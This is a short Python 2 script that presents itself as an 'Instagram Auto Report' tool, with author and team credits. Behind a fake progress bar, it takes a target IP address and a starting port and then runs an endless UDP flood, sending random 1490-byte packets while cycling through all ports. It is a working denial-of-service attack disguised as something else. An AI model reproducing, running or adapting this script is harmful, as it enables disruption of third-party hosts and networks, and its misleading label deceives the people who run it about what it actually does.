import sys
import os
import time
import socket
import random
#Code Time
from datetime import datetime
now = datetime.now()
hour = now.hour
minute = now.minute
day = now.day
month = now.month
year = now.year

##############
sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
bytes = random._urandom(1490)
#############

os.system("clear")
os.system("figlet Instagram Auto Report")
print
print "Author   : [DARKHEAVEN]"
print "TEAM     : [DARKHOLE]"
print "INSTAGRAM: [dark_h_e_a_v_e_n]"
print "GITHUB   : [DarkHeaveN123]"
print "TEAM-1   : [Shadow Hunter]"
print "TEAM-2   : [Joju Bhai]"
print "TEAM-3   : [Ibrahim Qureshi]"
print "TEAM-4   : [Kannan Bhai]"
ip = raw_input("Error No account  : ")
port = input("Porxy        : ")

os.system("clear")
os.system("figlet Attack Starting")
print "[                    ] 0% "
time.sleep(5)
print "[=====               ] 25%"
time.sleep(5)
print "[==========          ] 50%"
time.sleep(6)
print "[===============     ] 75%"
time.sleep(8)
print "[====================] 100%"
time.sleep(3)
sent = 0
while True:
     sock.sendto(bytes, (ip,port))
     sent = sent + 1
     port = port + 1
     print "Sent %s packet to %s throught port:%s"%(sent,ip,port)
     if port == 65534:
       port = 1
